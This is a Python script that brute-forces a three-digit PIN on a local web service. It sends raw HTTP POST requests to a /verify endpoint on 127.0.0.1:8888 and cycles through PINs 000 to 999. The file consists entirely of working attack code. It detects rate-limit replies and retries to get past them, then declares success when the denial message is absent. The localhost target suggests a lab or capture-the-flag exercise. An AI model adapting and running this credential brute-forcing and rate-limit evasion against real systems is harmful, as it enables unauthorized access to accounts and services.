import socket
import time
import re

def create_post_request(pin):
    data = f"magicNumber={pin}"
    return f"""POST /verify HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(data)}
Connection: close

{data}"""

def try_pin(s, pin, retry_count=0):
    formatted_pin = f"{pin:03d}"
    request = create_post_request(formatted_pin)
    
    try:
        s.send(request.encode())
        
        response_data = []
        s.settimeout(2)
        
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response_data.append(chunk)
            except socket.timeout:
                break
        
        response = b''.join(response_data).decode('utf-8', errors='ignore')
        
        if "slow down" in response.lower():
            if retry_count < 3: 
                print(f"[!] Rate limited. Waiting longer before retry...")
                time.sleep(2)  
                return try_pin(s, pin, retry_count + 1)
            else:
                print(f"[!] Too many retries for PIN {formatted_pin}")
                return False
        
        if "Access Denied" not in response and "ENTER PIN" not in response:
            print(f"\n[+] Success! The correct PIN is: {formatted_pin}")
            print(f"[+] Server response:")
            print(response.strip())
            return True
        
        print(f"[-] Trying PIN {formatted_pin} - Access Denied")
        return False
        
    except socket.error as e:
        print(f"[-] Socket error with PIN {formatted_pin}: {e}")
        return False

def main():
    host = '127.0.0.1'
    port = 8888
    
    print("[*] Starting PIN brute force attack...")
    print("[*] Note: Using 1 second delay between attempts to handle rate limiting")
    print(f"[*] Target: {host}:{port}")
    
    for pin in range(1000):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((host, port))
                
                if try_pin(s, pin):
                    break
                
                time.sleep(1)
                
        except ConnectionRefusedError:
            print("[!] Connection refused. Make sure the server is running.")
            return
        except socket.error as e:
            print(f"[!] Error occurred: {e}")
            time.sleep(1)
            continue

if __name__ == "__main__":
    main()